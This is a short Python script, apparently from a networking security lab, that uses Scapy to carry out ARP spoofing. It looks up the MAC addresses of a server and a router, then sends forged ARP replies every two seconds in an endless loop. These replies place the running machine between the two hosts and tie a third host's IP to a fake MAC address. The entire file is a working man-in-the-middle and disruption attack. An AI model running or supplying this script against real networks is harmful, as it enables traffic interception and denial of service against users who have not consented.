from scapy.all import *
server_ip = "198.13.0.14"
router_ip = "198.13.0.1"
middle_ip = "198.13.0.15"
adresa_middle = "02:42:c6:0d:00:0f"
adresa_fictiva = "03:43:c6:0d:00:0f"
broadcast = "ff:ff:ff:ff:ff:ff"

def get_mac(ip):
    answered,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),timeout=10)
    for send,rec in answered:
        return rec[ARP].hwsrc
    return None

server_mac=get_mac(server_ip)
router_mac=get_mac(router_ip)


a = ARP()
a.pdst=server_ip
a.psrc=router_ip
a.hwdst= server_mac

b = ARP()
b.pdst=router_ip
b.psrc=server_ip
b.hwdst= router_mac

c = ARP()
c.pdst=server_ip
c.hwsrc=adresa_fictiva
c.psrc=middle_ip
c.hwdst= server_mac

d = ARP()
d.pdst=router_ip
d.hwsrc=adresa_fictiva
d.psrc=middle_ip
d.hwdst= router_mac

while True:
    send(a)
    send(b)
    send(c)
    send(d)
    time.sleep(2)
